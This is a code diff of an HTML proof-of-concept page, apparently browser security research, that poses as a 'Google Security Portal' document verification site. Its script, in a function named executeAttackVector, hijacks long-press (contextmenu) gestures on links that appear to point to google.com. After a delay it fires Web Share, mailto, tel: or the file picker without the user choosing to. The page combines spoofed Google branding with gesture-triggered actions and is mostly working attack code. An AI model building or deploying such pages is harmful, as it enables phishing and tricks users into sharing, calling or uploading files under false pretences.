@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Picker & Protocol Spoof PoC</title>
+    <title>File Picker, Protocol & Combined Web Share PoC</title>
     <style>
         :root {
             --primary-color: #1a73e8;
@@ -29,11 +29,11 @@
         }
 
         .banner {
-            font-size: 12px;
+            font-size: 13px;
             color: var(--muted-color);
             margin-bottom: 6px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.8px;
             font-weight: 600;
         }
 
@@ -51,22 +51,21 @@
             max-width: 340px;
         }
 
-        .spoof-link {
+        a.spoof-link {
             display: inline-block;
             background-color: var(--primary-color);
             color: white;
-            padding: 14px 20px;
+            padding: 14px 24px;
             text-decoration: none;
             font-weight: 600;
             font-size: 14px;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.2);
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s, transform 0.1s;
             cursor: pointer;
-            border: none;
         }
 
-        .spoof-link:active {
+        a.spoof-link:active {
             background-color: var(--primary-hover);
             transform: scale(0.98);
         }
@@ -81,7 +80,7 @@
             width: 100%;
             border-radius: 8px;
             border: 1px solid var(--border-color);
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
         }
 
         .file-info {
@@ -104,15 +103,15 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Document Verification</h1>
 
-    <!-- Container dengan 4 Tombol Interaksi Terpisah -->
+    <!-- Container dengan Tombol Terintegrasi Web Share API -->
     <div class="button-container">
-        <button class="spoof-link" id="targetLinkMailto" data-action="mailto" data-intent="identity_verification">Open Window & Email ID Verification</button>
-        <button class="spoof-link" id="targetLinkTel" data-action="tel" data-intent="account_recovery">Open Window & Call Recovery Support</button>
-        <button class="spoof-link" id="targetLinkFile" data-action="filepicker" data-intent="document_upload">Open Window & Upload Document</button>
-        <button class="spoof-link" id="targetLinkShare" data-action="webshare" data-intent="system_share">Open Window & Trigger Web Share</button>
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window, Mailto & Share</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window, Tel & Share</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window, FilePicker & Share</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkShare" data-intent="system_share">Open Window & Pure Web Share</a>
     </div>
 
-    <!-- Area Pratinjau / Informasi Status -->
+    <!-- Uploaded Image / Share Preview Box -->
     <div class="preview-container" id="previewBox">
         <img id="imagePreview" src="" alt="File Preview">
         <div class="file-info" id="fileInfo"></div>
@@ -121,100 +120,114 @@
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        let isProcessing = false;
+        let triggered = false;
 
-        const executeAction = async (actionType, intent) => {
-            if (isProcessing) return;
-            isProcessing = true;
+        // Fungsi bantu untuk memicu Web Share API secara asinkron di dalam interaksi pengguna
+        const triggerWebShare = async (intent) => {
+            if (navigator.share) {
+                try {
+                    await navigator.share({
+                        title: 'Google Security Verification',
+                        text: `Secure verification payload triggered for intent: ${intent}`,
+                        url: window.location.href
+                    });
+                    return true;
+                } catch (err) {
+                    console.debug("Web Share cancelled or failed:", err.message);
+                    return false;
+                }
+            }
+            return false;
+        };
 
-            const previewBox = document.getElementById("previewBox");
-            const imagePreview = document.getElementById("imagePreview");
-            const fileInfo = document.getElementById("fileInfo");
+        const executeAttackVector = (actionType, intent) => {
+            if (triggered) return;
+            triggered = true;
 
-            // Jeda waktu optimal untuk simulasi UX/animasi transisi jendela
             setTimeout(async () => {
                 try {
-                    imagePreview.src = "";
-                    previewBox.style.display = "block";
+                    const previewBox = document.getElementById("previewBox");
+                    const imagePreview = document.getElementById("imagePreview");
+                    const fileInfo = document.getElementById("fileInfo");
 
-                    switch (actionType) {
-                        case 'mailto': {
-                            const subject = encodeURIComponent("Security Verification - Intent: " + intent);
-                            const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
-                            window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
-                            fileInfo.innerText = `[Success] Mailto protocol triggered for: ${intent}`;
-                            break;
-                        }
-                        case 'tel': {
-                            window.location.href = "tel:+18005550199";
-                            fileInfo.innerText = `[Success] Tel protocol triggered for: ${intent}`;
-                            break;
-                        }
-                        case 'filepicker': {
-                            if (!window.showOpenFilePicker) {
-                                throw new Error("File System Access API not supported in this browser.");
-                            }
-                            const [fileHandle] = await window.showOpenFilePicker({
-                                multiple: false,
-                                types: [{
-                                    description: 'Images & Documents',
-                                    accept: { 
-                                        'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
-                                        'application/pdf': ['.pdf']
-                                    }
-                                }]
-                            });
+                    // Selalu jalankan Web Share API terlebih dahulu (atau bersamaan) pada setiap tombol
+                    const sharedSuccessfully = await triggerWebShare(intent);
 
-                            const file = await fileHandle.getFile();
-                            fileInfo.innerText = `Selected file [${intent}]: ${file.name}`;
+                    if (actionType === 'mailto') {
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        fileInfo.innerText = `Triggered mailto & Web Share for intent: [${intent}] (Shared: ${sharedSuccessfully})`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'tel') {
+                        window.location.href = "tel:+18005550199";
+                        fileInfo.innerText = `Triggered tel & Web Share for intent: [${intent}] (Shared: ${sharedSuccessfully})`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    } 
+                    else if (actionType === 'filepicker') {
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false,
+                            types: [{
+                                description: 'Images & Documents',
+                                accept: { 
+                                    'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+                                    'application/pdf': ['.pdf']
+                                }
+                            }]
+                        });
 
-                            if (file.type && file.type.startsWith('image/')) {
-                                imagePreview.src = URL.createObjectURL(file);
-                            }
-                            break;
+                        const file = await fileHandle.getFile();
+                        fileInfo.innerText = `Selected file [${intent}]: ${file.name} | Web Share: ${sharedSuccessfully}`;
+
+                        if (file.type && file.type.startsWith('image/')) {
+                            imagePreview.src = URL.createObjectURL(file);
+                            previewBox.style.display = "block";
+                        } else {
+                            imagePreview.src = "";
+                            previewBox.style.display = "block";
                         }
-                        case 'webshare': {
-                            if (navigator.share) {
-                                await navigator.share({
-                                    title: 'Google Security Verification',
-                                    text: `Secure verification token requested for intent: ${intent}`,
-                                    url: window.location.href
-                                });
-                                fileInfo.innerText = `[Success] Web Share executed for: ${intent}`;
-                            } else {
-                                fileInfo.innerText = `[Notice] Web Share API is not available here.`;
-                            }
-                            break;
-                        }
-                        default:
-                            throw new Error("Unknown action type.");
                     }
+                    else if (actionType === 'webshare') {
+                        fileInfo.innerText = `Web Share API executed successfully for intent: [${intent}]`;
+                        imagePreview.src = "";
+                        previewBox.style.display = "block";
+                    }
+
                 } catch (err) {
-                    console.debug("Action execution cancelled or blocked:", err.message);
-                    fileInfo.innerText = `Action cancelled or restricted by browser policy.`;
+                    console.debug("Handler cancelled or blocked:", err.message);
                 } finally {
-                    // Reset status kunci proses setelah jeda singkat
-                    setTimeout(() => {
-                        isProcessing = false;
-                    }, 800);
+                    setTimeout(() => { triggered = false; }, 900);
                 }
             }, 1200);
         };
 
-        // Menggunakan elemen <button> standar agar mendukung event handler dengan bersih dan konsisten
-        document.querySelectorAll('.spoof-link').forEach(btn => {
-            const action = btn.getAttribute('data-action');
-            const intent = btn.getAttribute('data-intent');
-
-            btn.addEventListener("click", (e) => {
-                e.preventDefault();
-                executeAction(action, intent);
-            });
-
-            btn.addEventListener("touchstart", (e) => {
-                // Biarkan event sentuh berjalan optimal tanpa intervensi pasif berlebih
-            }, { passive: true });
+        // Event Listeners untuk masing-masing tombol
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
         });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
+
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
+
+        const linkFile = document.getElementById("targetLinkFile");
+        linkFile.addEventListener("contextmenu", (e) => {
+            executeAttackVector('filepicker', linkFile.getAttribute('data-intent'));
+        });
+        linkFile.addEventListener("touchstart", () => {}, { passive: true });
+
+        const linkShare = document.getElementById("targetLinkShare");
+        linkShare.addEventListener("contextmenu", (e) => {
+            executeAttackVector('webshare', linkShare.getAttribute('data-intent'));
+        });
+        linkShare.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
